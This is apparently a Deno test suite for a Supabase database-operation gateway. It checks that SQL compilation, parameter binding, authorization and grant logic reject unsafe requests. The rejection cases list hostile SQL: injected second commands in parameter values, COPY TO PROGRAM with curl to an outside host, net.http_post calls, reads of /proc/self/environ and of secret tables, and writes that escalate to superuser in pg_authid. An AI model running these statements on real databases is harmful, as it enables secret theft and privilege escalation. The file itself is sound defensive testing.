import assert from "node:assert/strict";
import {
  createDatabaseOperationHandler,
  type DatabaseDependencies,
  databaseExecutionScope,
  validateDatabaseContracts,
} from "./index.ts";
import {
  databaseOperationNames,
  databaseOperations,
  databaseProject,
} from "./contracts.ts";
import { compileDatabasePlan } from "./plan.ts";
import {
  compileSql,
  DatabaseCompileError,
  parameterLiteral,
  parsedStatement,
  publicRelation,
} from "./sql.ts";
import { argumentDigest } from "../_shared/sandy_api_protocol.ts";
type Row = Record<string, any>;
const actor = "11111111-1111-4111-8111-111111111111";
const requestId = "22222222-2222-4222-8222-222222222222";
const grantId = "33333333-3333-4333-8333-333333333333";
const admissionId = "44444444-4444-4444-8444-444444444444";
const commandId = "55555555-5555-4555-8555-555555555555";
const context = {
  actor_id: actor,
  tenant_id: null,
  request_id: requestId,
  grant_id: grantId,
  admission_id: admissionId,
};
const migration = {
  version: "20261021010101_fixture",
  name: "Synthetic source test only",
  expected_before_sha256: "a".repeat(64),
};
const verification = {
  sql: "SELECT true AS ok",
  expected_rows: [{ ok: true }],
};
const sourceStatement = {
  sql: "SELECT $1::text AS value",
  parameters: [{ type: "text", value: "Fixture value" }],
};
function fixtureArgs(operation: string): Row {
  const c = databaseOperations[operation];
  if (c.kind === "ddl") {
    const properties = c.input_schema.properties as Row;
    const required = c.input_schema.required as string[];
    const defaults: Row = {
      migration,
      name: "fixture_object",
      table: "fixture_table",
      new_name: "fixture_renamed",
      columns: ["id"],
      primary_key: ["id"],
      column: "fixture_column",
      type: "text",
      nullable: true,
      query: { sql: "SELECT 1 AS fixture" },
      arguments: [{ name: "value", type: "int4" }],
      returns: "int4",
      body: "SELECT $1::int4",
      definition_sql: "SELECT id FROM public.fixture_table",
      argument_types: ["int4"],
      timing: "BEFORE",
      events: ["INSERT"],
      function: "fixture_trigger",
      function_sha256: "a".repeat(64),
      unique: false,
      method: "btree",
      kind: "check",
      expression: { sql: "id >= 0" },
      labels: ["a", "b"],
      value: "a",
      new_value: "c",
      role: "authenticated",
      privileges: ["SELECT"],
      roles: ["authenticated"],
      command: "SELECT",
      tables: ["fixture_table"],
    };
    if (operation === "supabase.schema.tables.create") {
      defaults.columns = [{ name: "id", type: "text", nullable: false }];
    }
    if (operation === "supabase.schema.tables.add_column") {
      defaults.column = {
        name: "fixture_column",
        type: "text",
        nullable: true,
      };
    }
    if (operation.includes(".procedures.")) defaults.body = "SELECT 1";
    if (operation.includes(".extensions.")) defaults.name = "pg_trgm";
    if (operation.includes(".roles.")) defaults.name = "sandy_customer_fixture";
    const result: Row = Object.fromEntries(
      required.map((field) => [field, defaults[field]]),
    );
    if (operation === "supabase.schema.tables.alter_column") {
      result.nullable = true;
    }
    if (operation === "supabase.schema.constraints.add") {
      result.expression = defaults.expression;
    }
    if (operation === "supabase.database.rls.policies.alter") {
      result.roles = defaults.roles;
    }
    for (const field of Object.keys(result)) {
      assert.ok(
        properties[field],
        `${operation}: undeclared fixture field ${field}`,
      );
    }
    return result;
  }
  if (c.kind === "query" || c.kind === "explain") return sourceStatement;
  if (c.kind === "receipt_get") return { source_request_id: requestId };
  if (c.kind === "dml") {
    return {
      sql:
        "UPDATE public.fixture_table SET value=$1::text WHERE id=$2::text RETURNING *",
      parameters: [{ type: "text", value: "updated" }, {
        type: "text",
        value: "id",
      }],
      max_affected_rows: 1,
      verification,
    };
  }
  if (c.kind === "transaction") {
    return {
      statements: [{
        sql: "DELETE FROM public.fixture_table WHERE id=$1::text RETURNING *",
        parameters: [{ type: "text", value: "id" }],
      }],
      max_affected_rows: 1,
      verification,
    };
  }
  if (["migration_plan", "migration_apply"].includes(c.kind)) {
    return {
      migration,
      statements: [{ sql: "CREATE TABLE public.fixture_table(id text)" }],
      smoke_tests: [verification],
    };
  }
  if (c.kind === "migration_verify") {
    return {
      version: migration.version,
      checksum: "a".repeat(64),
      expected_schema_sha256: "a".repeat(64),
    };
  }
  if (c.kind === "migration_repair") {
    return {
      version: migration.version,
      expected_checksum: "a".repeat(64),
      replacement_checksum: "b".repeat(64),
      expected_schema_sha256: "c".repeat(64),
      reason: "Synthetic component reconciliation only",
      smoke_tests: [verification],
    };
  }
  if (c.kind === "diff") return { baseline: [] };
  if (c.kind === "routine_get") {
    return { name: "fixture_function", argument_types: ["int4"] };
  }
  if (["migration_list", "publication_list", "webhook_list"].includes(c.kind)) {
    return {};
  }
  if (["data_insert", "data_bulk_import"].includes(c.kind)) {
    return {
      table: "fixture_table",
      rows: [{ id: "id", value: "payload" }],
      max_affected_rows: 1,
      verification,
    };
  }
  if (c.kind === "data_upsert") {
    return {
      table: "fixture_table",
      rows: [{ id: "id", value: "payload" }],
      conflict_columns: ["id"],
      max_affected_rows: 1,
      verification,
    };
  }
  if (c.kind === "data_update") {
    return {
      table: "fixture_table",
      values: { value: "payload" },
      filters: [{
        column: "id",
        operator: "eq",
        value: { type: "text", value: "id" },
      }],
      max_affected_rows: 1,
      verification,
    };
  }
  if (c.kind === "data_delete") {
    return {
      table: "fixture_table",
      filters: [{
        column: "id",
        operator: "eq",
        value: { type: "text", value: "id" },
      }],
      max_affected_rows: 1,
      verification,
    };
  }
  if (c.kind === "data_export") {
    return {
      table: "fixture_table",
      columns: ["id", "value"],
      order_by: ["id"],
      limit: 10,
    };
  }
  if (c.kind.startsWith("maintenance_")) return { table: "fixture_table" };
  if (c.kind === "slow_queries") return { limit: 10 };
  if (c.kind.startsWith("connection_")) {
    return { pid: 4242, expected_backend_start: "2026-10-20T10:00:00Z" };
  }
  if (c.kind === "cron_create") {
    return {
      name: "fixture_job",
      schedule: "0 0 * * *",
      command: { sql: "SELECT 1 AS fixture" },
    };
  }
  if (c.kind === "cron_update") return { job_id: 1, active: false };
  if (c.kind === "cron_delete") return { job_id: 1 };
  throw Error(`Missing fixture for concrete operation ${operation}`);
}
function resultFor(operation: string, limit = 100): Row {
  const mutation = databaseOperations[operation].is_mutation;
  return {
    ok: true,
    contract_version: "1.0.0",
    operation,
    project_ref: databaseProject,
    read_only: !mutation,
    transactional: true,
    mutation_committed: mutation,
    verification_passed: mutation,
    command_id: mutation ? commandId : null,
    statements: [{
      row_count: 1,
      rows: [{
        fixture: "Synthetic HTTP composition only; no provider execution",
      }],
      possibly_truncated: false,
    }],
    result_limit: limit,
    possibly_truncated: false,
  };
}
function fixture(
  options: {
    policy?: Row;
    grant?: Row;
    result?: unknown;
    status?: number;
    throwFetch?: boolean;
    raw?: string;
    finish?: boolean;
    providerRows?: unknown;
  } = {},
) {
  const calls: Row[] = [],
    grants: Row[] = [],
    finishes: Row[] = [],
    policies: Row[] = [];
  const dependencies: DatabaseDependencies = {
    service: "synthetic-service-identity",
    management: "synthetic-management-private-value",
    reviewedTriggerFunctions: { fixture_trigger: "a".repeat(64) },
    authorizeContext: async (ctx, op) => {
      policies.push({ ctx, op });
      return (options.policy ?? { allowed: true }) as any;
    },
    consumeGrant: async (grant) => {
      grants.push(grant);
      return (options.grant ??
        { allowed: true, reused: false, admission_id: admissionId }) as any;
    },
    finishExecution: async (finish) => {
      finishes.push(finish);
      return { allowed: options.finish ?? true };
    },
    fetch: (async (input: string | URL | Request, init: RequestInit) => {
      const body = JSON.parse(String(init.body));
      const match = body.query.match(
        /public\.sandy_api_database_(read|write|preflight)\(pg_catalog.convert_from\(pg_catalog.decode\('([a-f0-9]+)'/,
      );
      const payload = match
        ? JSON.parse(
          new TextDecoder().decode(
            Uint8Array.from(match[2].match(/../g), (s: string) =>
              parseInt(s, 16)),
          ),
        )
        : null;
      calls.push({ url: String(input), init, body, payload });
      if (options.throwFetch) throw Error("Synthetic transport loss");
      if (options.raw !== undefined) {
        return new Response(options.raw, { status: options.status ?? 200 });
      }
      const data = match?.[1] === "preflight"
        ? [{ result: { ok: true } }]
        : !match
        ? options.providerRows ?? []
        : [{
          result: options.result ??
            ({
              ...resultFor(payload.operation, payload.plan.result_limit),
              ...(match?.[1] === "read"
                ? {
                  read_only: true,
                  mutation_committed: false,
                  verification_passed: false,
                  command_id: null,
                }
                : {}),
            }),
        }];
      return Response.json(data, {
        status: options.status ?? 201,
        headers: { "x-request-id": "synthetic-provider-request" },
      });
    }) as typeof fetch,
  };
  const handler = createDatabaseOperationHandler(dependencies);
  const invoke = async (
    operation = "supabase.sql.query",
    args = fixtureArgs(operation),
    overrides: Row = {},
  ) =>
    handler(
      new Request("https://edge.fixture.invalid", {
        method: "POST",
        headers: {
          authorization: "Bearer synthetic-service-identity",
          "content-type": "application/json",
        },
        body: JSON.stringify({
          operation,
          arguments: args,
          ...context,
          ...overrides,
        }),
      }),
    );
  return { dependencies, calls, grants, finishes, policies, invoke, handler };
}

Deno.test("Every concrete database contract compiles to an executable plan; existing provider migration IDs remain untouched", async () => {
  assert.equal(validateDatabaseContracts(), databaseOperationNames.length);
  assert.ok(databaseOperationNames.length >= 75);
  for (
    const id of [
      "supabase.db.migrations.apply",
      "supabase.db.migrations.repair",
      "supabase.db.migrations.list",
      "supabase.schema.tables.list",
    ]
  ) assert.equal(databaseOperations[id], undefined);
  for (const operation of databaseOperationNames) {
    const plan = await compileDatabasePlan(operation, fixtureArgs(operation));
    assert.ok(plan.statements.length || plan.repair, operation);
    assert.equal(databaseOperations[operation].requires_approval, true);
    assert.equal(databaseOperations[operation].api_key_delegable, false);
    if (plan.mode === "transaction") {
      assert.ok(plan.verifications.length, operation);
    }
    for (const statement of plan.statements) {
      assert.ok(statement.sql.length > 0);
    }
  }
});

Deno.test("PostgreSQL scanner binds Unicode/comments/dollar strings without substituting user values into SQL", async () => {
  const value = "'; SELECT net.http_post('https://outside.invalid') -- é";
  const sql =
    "SELECT 'é' AS label, $1::text AS value, '$2' AS literal, $$ $3; $$ AS dollar /* $4 */; -- fixture";
  const compiled = await compileSql(sql, [{ type: "text", value }]);
  assert.ok(compiled.sql.includes("(($1 ->> 0)::pg_catalog.text)::text"));
  assert.equal(compiled.sql.includes(value), false);
  assert.deepEqual(compiled.parameters, [value]);
  assert.ok(compiled.sql.includes("'$2'"));
  assert.ok(compiled.sql.includes("$$ $3; $$"));
  assert.equal(compiled.sql.includes("/* $4 */"), true);
  assert.equal(compiled.sql.includes("; -- fixture"), false);
  assert.deepEqual(compiled.passive_relations, []);
  const data = await compileSql(
    "WITH x AS (SELECT id FROM public.fixture_table) SELECT id FROM x",
    [],
  );
  assert.deepEqual(data.passive_relations, [{
    schema: "public",
    name: "fixture_table",
  }]);
  assert.ok(!parameterLiteral({ type: "text", value }).includes(value));
});

Deno.test("SQL AST rejects side effects, inline schema/type bypasses, protected objects and privilege/transaction escapes", async () => {
  const denied = [
    "SELECT 1; DELETE FROM public.fixture_table RETURNING *",
    "WITH changed AS (DELETE FROM public.fixture_table RETURNING *) SELECT * FROM changed",
    "SELECT * INTO public.fixture_copy FROM public.fixture_table",
    "SELECT * FROM public.fixture_table FOR UPDATE",
    "SELECT net.http_post('https://outside.invalid')",
    "SELECT extensions.http_get('https://outside.invalid')",
    "SELECT pg_read_file('/proc/self/environ')",
    "SELECT set_config('transaction_read_only','off',true)",
    "SELECT * FROM vault.decrypted_secrets",
    "SELECT * FROM public.sandy_api_credentials",
    "SELECT access_token AS harmless FROM public.fixture_table",
    "SELECT $1::public.unsafe_type",
    "SELECT 1 OPERATOR(public.unsafe) 2",
  ];
  for (const sql of denied) {
    await assert.rejects(
      () =>
        compileSql(
          sql,
          sql.includes("$1") ? [{ type: "text", value: "x" }] : [],
        ),
      DatabaseCompileError,
      sql,
    );
  }
  for (
    const sql of [
      "UPDATE auth.users SET email='x' RETURNING *",
      "UPDATE public.sandy_controller_admins SET enabled=true RETURNING *",
    ]
  ) {
    await assert.rejects(
      () => compileSql(sql, [], "dml"),
      DatabaseCompileError,
    );
  }
  for (
    const sql of [
      "DROP TABLE public.sandy_controller_admins",
      "DROP TABLE auth.users",
      "DROP FUNCTION public.fixture_function()",
      "ALTER TABLE public.fixture_table OWNER TO postgres",
      "ALTER TABLE public.fixture_table DISABLE TRIGGER ALL",
      "DO $$ BEGIN NULL; END $$",
      "COPY public.fixture_table TO PROGRAM 'curl outside.invalid'",
      "CREATE TABLE public.fixture_copy (LIKE public.fixture_table INCLUDING ALL)",
      "CREATE TABLE public.fixture_copy(id int) INHERITS(public.fixture_table)",
      "CREATE INDEX fixture_index ON public.fixture_table USING custom_method(id)",
    ]
  ) {
    await assert.rejects(
      () => parsedStatement(sql, "definition"),
      DatabaseCompileError,
      sql,
    );
  }
  await assert.rejects(
    () => compileSql("SELECT $2::text", [{ type: "text", value: "x" }]),
    /sql_parameter_binding_missing/,
  );
  await assert.rejects(
    () => compileSql("SELECT 1", [{ type: "text", value: "unused" }]),
    /unused_sql_parameter/,
  );
  await assert.rejects(
    () => compileSql("UPDATE public.fixture_table SET id='x'", [], "dml"),
    /returning_clause_required/,
  );
  assert.throws(
    () => publicRelation("fixture; DROP TABLE x"),
    /invalid_database_identifier/,
  );
  // Quoted inert text is not confused with a callable function or statement.
  assert.ok((await compileSql("SELECT 'net.http_post; DELETE' AS inert")).sql);
});

Deno.test("HTTP composition forwards only a fixed Management call with actual read_only and one-use input/contract/scope binding", async () => {
  const f = fixture();
  const args = {
    sql: "SELECT $1::text AS value",
    parameters: [{ type: "text", value: "Unicode é + quote ' is data" }],
    limit: 25,
  };
  const response = await f.invoke("supabase.sql.query", args);
  assert.equal(response.status, 200);
  const body = await response.json();
  assert.equal(body.result.read_only, true);
  assert.equal(f.calls.length, 1);
  assert.equal(
    f.calls[0].url,
    `https://api.supabase.com/v1/projects/${databaseProject}/database/query`,
  );
  assert.equal(
    f.calls[0].init.headers.authorization,
    "Bearer synthetic-management-private-value",
  );
  assert.equal(f.calls[0].body.read_only, true);
  assert.ok(
    f.calls[0].body.query.startsWith(
      "SET LOCAL statement_timeout='15000'; SET LOCAL lock_timeout='3000'; SET LOCAL standard_conforming_strings=on; SELECT public.sandy_api_database_read(",
    ),
  );
  assert.deepEqual(f.calls[0].payload.arguments, args);
  assert.equal(f.calls[0].payload.input_sha256, await argumentDigest(args));
  assert.equal(f.grants[0].input_sha256, await argumentDigest(args));
  assert.equal(
    f.grants[0].contract_sha256,
    databaseOperations["supabase.sql.query"].contract_sha256,
  );
  assert.equal(
    f.grants[0].scope_sha256,
    await argumentDigest(databaseExecutionScope("supabase.sql.query")),
  );
  assert.equal(f.finishes[0].outcome, "succeeded");
  assert.equal(
    JSON.stringify(body).includes("synthetic-management-private-value"),
    false,
  );
});

Deno.test("A service transport never becomes a user/API-key principal and all authorization gates fail before provider calls", async () => {
  const unauthorized = fixture();
  assert.equal(
    (await unauthorized.handler(
      new Request("https://edge.fixture.invalid", {
        method: "POST",
        body: "{}",
      }),
    )).status,
    403,
  );
  for (
    const overrides of [{ tenant_id: actor }, { credential_id: actor }, {
      actor_id: "invalid",
    }, { project_ref: "other" }]
  ) {
    const f = fixture();
    assert.equal(
      (await f.invoke("supabase.sql.query", sourceStatement, overrides)).status,
      400,
    );
    assert.equal(f.calls.length, 0);
    assert.equal(f.grants.length, 0);
  }
  for (
    const policy of [{
      allowed: false,
      error: "owner_required",
      http_status: 403,
    }, {
      allowed: false,
      error: "verified_database_execution_contract_required",
      http_status: 424,
    }]
  ) {
    const f = fixture({ policy });
    const response = await f.invoke();
    assert.equal(response.status, policy.http_status);
    assert.equal(f.calls.length, 0);
    assert.equal(f.grants.length, 0);
  }
  for (
    const grant of [
      {
        allowed: false,
        error: "execution_grant_scope_denied",
        http_status: 403,
      },
      { allowed: true, reused: true, admission_id: admissionId },
      { allowed: true, reused: false, admission_id: "bad" },
    ]
  ) {
    const f = fixture({ grant });
    assert.ok((await f.invoke()).status >= 400);
    assert.equal(f.calls.length, 0);
  }
  const f = fixture();
  f.dependencies.management = "";
  assert.equal((await f.invoke()).status, 424);
  assert.equal(f.grants.length, 0);
});

Deno.test("Malformed/side-effecting and caller-routed SQL arguments cannot consume a grant", async () => {
  for (
    const args of [
      { sql: "SELECT 1", url: "https://outside.invalid" },
      { sql: "SELECT 1", read_only: false },
      { sql: "SELECT net.http_post('https://outside.invalid')" },
      { sql: "SELECT 1", parameters: [{ type: "text", value: "unused" }] },
      { sql: "SET ROLE postgres" },
    ]
  ) {
    const f = fixture();
    const response = await f.invoke("supabase.sql.query", args);
    assert.equal(response.status, 400);
    assert.equal(f.grants.length, 0);
    assert.equal(f.calls.length, 0);
  }
});

Deno.test("Typed DDL uses a versioned transaction, quoted fixed schema, safe persisted constants and constrained roles/routines", async () => {
  const op = "supabase.schema.tables.create";
  const args = {
    migration,
    name: "fixture_table",
    columns: [{
      name: "id",
      type: "text",
      nullable: false,
      default: {
        sql: "$1::text",
        parameters: [{
          type: "text",
          value: "'); SELECT net.http_post('outside');--",
        }],
      },
    }],
    primary_key: ["id"],
  };
  const plan = await compileDatabasePlan(op, args);
  assert.ok(
    plan.statements[0].sql.startsWith('CREATE TABLE "public"."fixture_table"'),
  );
  assert.equal(plan.statements[0].sql.includes("net.http_post"), false);
  assert.match(plan.migration!.checksum, /^[a-f0-9]{64}$/);
  assert.ok(plan.verifications[0].sql.includes("pg_catalog.pg_class"));
  const f = fixture();
  const response = await f.invoke(op, args);
  assert.equal(response.status, 200);
  assert.equal(f.calls[0].body.read_only, false);
  assert.equal(f.finishes[0].outcome, "accepted");
  const body = await response.json();
  assert.equal(body.result.mutation_committed, true);
  assert.equal(body.result.verification_passed, true);
  const rolePlan = await compileDatabasePlan(
    "supabase.database.roles.create",
    fixtureArgs("supabase.database.roles.create"),
  );
  assert.ok(
    rolePlan.statements[0].sql.includes(
      "NOLOGIN NOSUPERUSER NOCREATEDB NOCREATEROLE NOREPLICATION NOBYPASSRLS",
    ),
  );
  const view = await compileDatabasePlan(
    "supabase.schema.views.create",
    fixtureArgs("supabase.schema.views.create"),
  );
  assert.ok(view.statements[0].sql.includes("WITH(security_invoker=true)"));
  await assert.rejects(
    () =>
      compileDatabasePlan("supabase.schema.functions.create", {
        ...fixtureArgs("supabase.schema.functions.create"),
        body: "SELECT net.http_post('https://outside.invalid')",
      }),
    /sql_function_not_allowed/,
  );
  const trigger = fixture();
  trigger.dependencies.reviewedTriggerFunctions = {};
  assert.equal(
    (await trigger.invoke("supabase.schema.triggers.create")).status,
    424,
  );
  assert.equal(trigger.grants.length, 0);
});

Deno.test("Bound data operations reject empty filters, inconsistent rows and protected targets", async () => {
  const update = fixtureArgs("supabase.data.update");
  const compiled = await compileDatabasePlan("supabase.data.update", update);
  assert.ok(compiled.statements[0].sql.includes("jsonb_populate_record"));
  assert.ok(
    compiled.statements[0].sql.includes(
      'WHERE target."id" OPERATOR(pg_catalog.=) (($1 ->> 1)::pg_catalog.text)',
    ),
  );
  assert.deepEqual(compiled.statements[0].parameters, [
    { value: "payload" },
    "id",
  ]);
  for (
    const [operation, args] of [
      ["supabase.data.update", { ...update, filters: [] }],
      ["supabase.data.update", {
        ...update,
        table: "sandy_operation_registry",
      }],
      ["supabase.data.insert", {
        ...fixtureArgs("supabase.data.insert"),
        rows: [{ id: "a" }, { value: "b" }],
      }],
      ["supabase.data.delete", {
        ...fixtureArgs("supabase.data.delete"),
        filters: [{ column: "id", operator: "eq" }],
      }],
    ] as [string, Row][]
  ) {
    await assert.rejects(
      () => compileDatabasePlan(operation, args),
      DatabaseCompileError,
    );
  }
});

Deno.test("Malformed/foreign/unconfirmed effects and HTTP success errors remain errors; transport loss preserves unknown outcome", async () => {
  const op = "supabase.sql.execute";
  for (
    const result of [
      {},
      { ...resultFor(op), operation: "supabase.sql.query" },
      { ...resultFor(op), project_ref: "foreign" },
      { ...resultFor(op), mutation_committed: false },
      { ...resultFor(op), verification_passed: false },
      { ...resultFor(op), command_id: null },
      { ...resultFor(op), statements: null },
    ]
  ) {
    const f = fixture({ result });
    const response = await f.invoke(op);
    assert.equal(response.status, 502);
    const body = await response.json();
    assert.equal(body.ok, false);
    assert.equal(body.executed, null);
    assert.equal(body.reconciliation_required, true);
    assert.equal(f.finishes[0].outcome, "unknown");
  }
  for (
    const options of [{ throwFetch: true }, { raw: "broken JSON" }, {
      status: 503,
    }]
  ) {
    const f = fixture(options);
    const response = await f.invoke(op);
    assert.equal(response.status, 502);
    const body = await response.json();
    assert.equal(body.executed, null);
    assert.equal(body.reconciliation_required, true);
    assert.equal(f.finishes[0].outcome, "unknown");
  }
  const f = fixture({
    result: {
      ok: false,
      error: "database_postcondition_failed",
      http_status: 409,
      transaction_rolled_back: true,
    },
  });
  const response = await f.invoke(op);
  assert.equal(response.status, 409);
  assert.equal((await response.json()).executed, false);
  assert.equal(f.finishes[0].outcome, "failed");
  const noReceipt = fixture({ finish: false });
  assert.equal((await noReceipt.invoke(op)).status, 503);
});

Deno.test("Migration plans inspect ledger/snapshot without applying SQL and report checksum or schema drift truthfully", async () => {
  const operation = "supabase.db.migrations.plan";
  const args = fixtureArgs(operation);
  const plan = await compileDatabasePlan(operation, args);
  const result = {
    ...resultFor(operation),
    statements: [{
      row_count: 1,
      rows: [{
        snapshot: {
          sha256: "b".repeat(64),
          objects: [],
          possibly_truncated: false,
        },
      }],
      possibly_truncated: false,
    }, {
      row_count: 1,
      rows: [{
        version: migration.version,
        checksum: "c".repeat(64),
        state: "applied",
      }],
      possibly_truncated: false,
    }],
  };
  const f = fixture({ result });
  const response = await f.invoke(operation, args);
  assert.equal(response.status, 200);
  const body = await response.json();
  assert.equal(body.result.plan.migration_executed, false);
  assert.equal(body.result.plan.before_matches, false);
  assert.equal(body.result.plan.checksum_conflict, true);
  assert.equal(f.calls[0].body.read_only, true);
  assert.equal(
    f.calls[0].payload.plan.statements.some((s: Row) =>
      s.sql.startsWith("CREATE")
    ),
    false,
  );
  assert.ok(plan.migration?.checksum);
  const repair = await compileDatabasePlan(
    "supabase.db.migrations.ledger.repair",
    fixtureArgs("supabase.db.migrations.ledger.repair"),
  );
  assert.equal(repair.statements.length, 0);
  assert.equal(repair.verifications.length, 1);
  assert.ok(repair.repair?.expected_checksum);
});

Deno.test("Nontransactional maintenance and backend signals retain acceptance/unknown effect semantics", async () => {
  const f = fixture();
  const response = await f.invoke("supabase.database.analyze");
  assert.equal(response.status, 200);
  assert.equal(f.calls.length, 3);
  assert.equal(f.calls[0].body.read_only, true);
  assert.equal(f.calls[1].body.read_only, false);
  assert.equal(
    f.calls[1].body.query,
    `SET LOCAL statement_timeout='15000'; SET LOCAL lock_timeout='3000'; SET LOCAL standard_conforming_strings=on; ANALYZE "public"."fixture_table"`,
  );
  const body = await response.json();
  assert.equal(body.result.mutation_committed, null);
  assert.equal(body.result.effect_confirmed, false);
  assert.equal(body.result.reconciliation_required, true);
  assert.equal(f.finishes[0].outcome, "accepted");
  const cancel = fixture({ providerRows: [] });
  assert.equal(
    (await cancel.invoke("supabase.database.connections.cancel")).status,
    409,
  );
  assert.ok(cancel.calls[1].body.query.includes("backend_start="));
  assert.ok(
    cancel.calls[1].body.query.includes("backend_type='client backend'"),
  );
  assert.ok(cancel.calls[1].body.query.includes("usename NOT IN('postgres'"));
});

Deno.test("Review regressions: PG18 DML, privileged catalog targets, CTE scope, builtin overloads, private control tables and read-check metadata", async () => {
  const write = await compileSql(
    "UPDATE public.fixture_table SET value=$1 RETURNING value",
    [{ type: "text", value: "fixture" }],
    "dml",
  );
  assert.equal(write.mode, "dml");
  for (
    const sql of [
      "UPDATE pg_catalog.pg_authid SET rolsuper=true RETURNING rolname",
      "CREATE TABLE pg_catalog.review_only(x text)",
      "ALTER TABLE pg_catalog.pg_authid ADD COLUMN review_only text",
      "UPDATE pg_roles SET rolname='review_only' RETURNING rolname",
      "CREATE TABLE review_only(x text)",
      "ALTER TABLE pg_roles ADD COLUMN review_only text",
    ]
  ) {
    await assert.rejects(
      () =>
        parsedStatement(sql, sql.startsWith("UPDATE") ? "dml" : "definition"),
      /public_mutation_target_required/,
    );
  }
  for (const sql of ["SELECT * FROM fixture_table", "SELECT * FROM pg_roles"]) {
    await assert.rejects(
      () => compileSql(sql),
      /explicit_physical_relation_schema_required/,
    );
  }
  await assert.rejects(
    () => parsedStatement("DROP TABLE fixture_table", "definition"),
    /protected_database_object/,
  );
  const precedence = "SELECT 1 + 2 * 3 AS value";
  assert.equal((await compileSql(precedence)).sql, precedence);
  const stored = fixtureArgs("supabase.schema.materialized_views.create");
  stored.query = { sql: "SELECT id FROM public.fixture_table" };
  assert.deepEqual(
    (await compileDatabasePlan(
      "supabase.schema.materialized_views.create",
      stored,
    )).statements[0].passive_relations,
    [{ schema: "public", name: "fixture_table" }],
  );
  const routine = fixtureArgs("supabase.schema.functions.create");
  routine.body = "SELECT id FROM public.fixture_table";
  assert.deepEqual(
    (await compileDatabasePlan("supabase.schema.functions.create", routine))
      .statements[0].passive_relations,
    [{ schema: "public", name: "fixture_table" }],
  );

  for (
    const sql of [
      "SELECT * FROM pg_catalog.pg_authid",
      "SELECT * FROM pg_catalog.pg_subscription",
      "SELECT * FROM pg_catalog.pg_proc",
    ]
  ) await assert.rejects(() => compileSql(sql), /protected_database_object/);
  await assert.rejects(
    () =>
      compileSql(
        "SELECT * FROM review_only WHERE EXISTS(WITH review_only AS (SELECT 1) SELECT * FROM review_only)",
      ),
    /nested_or_recursive_cte_not_supported/,
  );
  await assert.rejects(
    () =>
      compileSql(
        "WITH second AS(SELECT * FROM first),first AS(SELECT 1) SELECT * FROM second",
      ),
    /cte_dependency_shadowing_not_supported/,
  );
  assert.ok(
    (await compileSql("SELECT lower(1,2)")).sql.includes(
      "pg_catalog.lower(1,2)",
    ),
    "public overload can never resolve",
  );
  for (
    const name of [
      "sandy_orch_jobs",
      "sandy_lifecycle_snapshots",
      "sandy_deployment_jobs",
      "sandy_memory_portal_accounts",
      "email_customer_addresses",
    ]
  ) assert.throws(() => publicRelation(name), /protected_database_object/);
  const args = fixtureArgs("supabase.data.update");
  args.verification = {
    sql: "SELECT id FROM public.fixture_table",
    expected_rows: [],
  };
  const plan = await compileDatabasePlan("supabase.data.update", args);
  assert.deepEqual(plan.verifications[0].passive_relations, [{
    schema: "public",
    name: "fixture_table",
  }]);
  const exportPlan = await compileDatabasePlan(
    "supabase.data.bulk_export",
    fixtureArgs("supabase.data.bulk_export"),
  );
  assert.deepEqual(exportPlan.statements[0].passive_relations, [{
    schema: "public",
    name: "fixture_table",
  }]);
  const policy = fixtureArgs("supabase.database.rls.policies.create");
  policy.using = { sql: "customer_id = auth.uid()" };
  assert.ok(
    (await compileDatabasePlan("supabase.database.rls.policies.create", policy))
      .statements[0].sql.includes("auth.uid()"),
  );
  await assert.rejects(
    () => compileSql("SELECT auth.uid()"),
    /sql_function_not_allowed/,
  );
  const columns = fixtureArgs("supabase.schema.tables.create");
  columns.columns[0].default = {
    sql: "(SELECT id FROM public.fixture_table LIMIT 1)",
  };
  await assert.rejects(
    () => compileDatabasePlan("supabase.schema.tables.create", columns),
    /scalar_subquery_not_supported/,
  );
});
Deno.test("Receipt reconciliation uses a fresh owner-bound read and wildcard nested credentials fail closed", async () => {
  const f = fixture();
  const response = await f.invoke("supabase.sql.receipt.get");
  assert.equal(response.status, 200);
  assert.deepEqual(f.calls[0].payload.plan.statements[0].parameters, [
    requestId,
    actor,
  ]);
  assert.equal(f.calls[0].body.read_only, true);
  assert.equal(
    f.calls[0].payload.plan.statements[0].sql.includes(
      "a.actor_id=($1->>1)::uuid",
    ),
    true,
  );
  for (
    const rows of [
      [{ api_key: "synthetic-do-not-echo" }],
      [{ signing_key: "synthetic-do-not-echo" }],
      [{ access_token: "synthetic-do-not-echo" }],
      [{
        nested: { refresh_token: "synthetic-do-not-echo" },
      }],
    ]
  ) {
    const result = resultFor("supabase.sql.query");
    result.statements[0].rows = rows;
    const h = fixture({ result });
    const denied = await h.invoke();
    assert.equal(denied.status, 502);
    assert.equal(
      JSON.stringify(await denied.json()).includes("synthetic-do-not-echo"),
      false,
    );
  }
});

Deno.test("Top-level VACUUM remains blocked when Management cannot enforce a server deadline", async () => {
  const f = fixture();
  const response = await f.invoke("supabase.database.vacuum");
  assert.equal(response.status, 424);
  assert.equal(
    (await response.json()).error,
    "database_top_level_vacuum_deadline_unavailable",
  );
  assert.equal(f.grants.length, 0);
  assert.equal(f.calls.length, 0);
});

Deno.test("Unsafe future scheduled execution and oversized payloads fail before any grant", async () => {
  for (
    const operation of [
      "supabase.database.cron.jobs.create",
      "supabase.database.cron.jobs.update",
    ]
  ) {
    const f = fixture();
    const response = await f.invoke(operation);
    assert.equal(response.status, 424, operation);
    assert.equal(f.grants.length, 0, operation);
    assert.equal(f.calls.length, 0, operation);
  }
  const large = fixture();
  const args = {
    sql: "SELECT $1::text,$2::text,$3::text",
    parameters: [1, 2, 3].map(() => ({
      type: "text",
      value: "x".repeat(40000),
    })),
  };
  const denied = await large.invoke("supabase.sql.query", args);
  assert.equal(denied.status, 413);
  assert.equal(
    (await denied.json()).error,
    "database_provider_request_size_limit",
  );
  assert.equal(large.grants.length, 0);
  assert.equal(large.calls.length, 0);
  const read = fixture();
  const result = await read.invoke("supabase.sql.query", {
    sql: "SELECT id FROM public.fixture_table",
  });
  assert.equal(result.status, 200);
  assert.ok(
    read.calls[0].body.query.includes(
      'LOCK TABLE "public"."fixture_table" IN ACCESS SHARE MODE; SELECT',
    ),
  );
});
